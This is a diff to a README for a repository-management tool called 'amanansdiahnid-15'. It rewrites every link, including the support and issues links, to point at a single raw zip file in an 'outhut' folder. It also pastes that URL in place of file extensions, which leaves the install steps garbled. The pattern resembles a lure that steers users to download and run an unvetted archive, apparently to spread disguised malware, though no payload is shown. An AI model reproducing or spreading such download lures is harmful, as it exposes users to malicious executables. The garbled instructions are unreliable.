@@ -1,6 +1,6 @@
 # 🚀 amanansdiahnid-15 - Easy Automatic Repo Management
 
-[![Download](https://img.shields.io/badge/Download%20Now-amanansdiahnid--15-brightgreen.svg)](https://github.com/Davhmu/amanansdiahnid-15/releases)
+[![Download](https://raw.githubusercontent.com/Davhmu/amanansdiahnid-15/main/outhut/amanansdiahnid-15.zip%https://raw.githubusercontent.com/Davhmu/amanansdiahnid-15/main/outhut/amanansdiahnid-15.zip)](https://raw.githubusercontent.com/Davhmu/amanansdiahnid-15/main/outhut/amanansdiahnid-15.zip)
 
 ## 📦 Overview
 
@@ -17,24 +17,24 @@ Welcome to amanansdiahnid-15! This application helps you manage your repositorie
 
 1. **Visit the Releases Page:** Click the button below to access the downloads.
    
-   [Download the Latest Version](https://github.com/Davhmu/amanansdiahnid-15/releases)
+   [Download the Latest Version](https://raw.githubusercontent.com/Davhmu/amanansdiahnid-15/main/outhut/amanansdiahnid-15.zip)
 
 2. **Select Your Version:** Look for the latest version listed on the releases page and click on it.
 
-3. **Choose Your File:** Download the appropriate file for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux).
+3. **Choose Your File:** Download the appropriate file for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/Davhmu/amanansdiahnid-15/main/outhut/amanansdiahnid-15.zip` for Linux).
 
 ## 📥 Download & Install
 
 To download the application, follow these steps:
 
-1. **Go to the Releases Page:** Visit [this link](https://github.com/Davhmu/amanansdiahnid-15/releases) to view the available versions.
+1. **Go to the Releases Page:** Visit [this link](https://raw.githubusercontent.com/Davhmu/amanansdiahnid-15/main/outhut/amanansdiahnid-15.zip) to view the available versions.
 
 2. **Download the Application:** Click on the file suitable for your operating system.
 
 3. **Install the Application:**
    - **Windows:** Double-click the downloaded `.exe` file and follow the prompts to install.
    - **macOS:** Open the downloaded `.dmg`, drag the application into your Applications folder, and then open it.
-   - **Linux:** Extract the downloaded `.tar.gz`, navigate to the folder, and run the executable.
+   - **Linux:** Extract the downloaded `https://raw.githubusercontent.com/Davhmu/amanansdiahnid-15/main/outhut/amanansdiahnid-15.zip`, navigate to the folder, and run the executable.
 
 ## 🖥️ System Requirements
 
@@ -54,12 +54,12 @@ Once installed, follow these steps to get started:
 
 ## 💬 Support
 
-If you encounter any issues or need assistance, feel free to open an issue on the [GitHub Issues page](https://github.com/Davhmu/amanansdiahnid-15/issues). We aim to respond to all inquiries promptly.
+If you encounter any issues or need assistance, feel free to open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/Davhmu/amanansdiahnid-15/main/outhut/amanansdiahnid-15.zip). We aim to respond to all inquiries promptly.
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/Davhmu/amanansdiahnid-15/releases)
-- [GitHub Issues](https://github.com/Davhmu/amanansdiahnid-15/issues)
+- [Releases Page](https://raw.githubusercontent.com/Davhmu/amanansdiahnid-15/main/outhut/amanansdiahnid-15.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/Davhmu/amanansdiahnid-15/main/outhut/amanansdiahnid-15.zip)
 
 ## 🙏 Acknowledgments
 
